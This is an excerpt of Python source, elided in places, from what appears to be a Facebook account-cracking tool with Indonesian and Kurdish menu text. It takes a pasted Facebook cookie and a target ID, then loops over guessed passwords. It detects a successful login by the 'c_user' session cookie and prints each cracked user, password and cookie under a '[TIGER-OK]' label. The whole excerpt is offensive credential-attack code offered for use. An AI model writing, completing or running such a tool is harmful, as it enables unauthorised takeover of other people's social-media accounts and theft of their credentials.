...
def Masuk():
	try:
		...
		os.system('clear')
		banner()
		jalan ('%s%s%s 01 %sChwna Zhwrawa ba (Cookie) '%(U,til,K,O))
		jalan ('%s%s%s 00 %sEXIT '%(U,til,M,O))
		while True:
			rom = input ("\n%s# %sHalbzhera %s> %s"%(P,O,M,K))
			if rom in(""):
				print("%s%s ERROR "%(M,til))
			elif rom in ('1','01'):
				jalane("\n%s!%s COOKIE FB DANE!"%(M,O))
...
class pilihan:
	...
	def menu(self):
		...
		if slut in['',' ']:
			...
			idt = input('%s%s %sLera/ID%s > %s'%(U,til,O,M,K))
			if idt in[""," "]:
		...
		if unikers in ('Y', 'y'):
			...
			while True:
				...
				if pwx == '':
					...
					print ('%s• %s01%s CRACK  FB%sFast '%(U,P,O,P,M))
					manual(pwx.split(','))
					break					
		elif unikers in ('T', 't'):
			print ('\n%s•%s [ %sHalbzhera [!]%s ]\n'%(U,O,U,O))
			print ('%s• %s01%s CRACK %sFAST '%(U,P,O,P,M))
			self.langsung()
		else:
			...
			for pw in manual:
				...
				if "c_user" in ses.cookies.get_dict():
					try:
						...
						pass
					print ('\r %s[TIGER-OK] %s : %s : %s '%(H,user,pw,kukis))
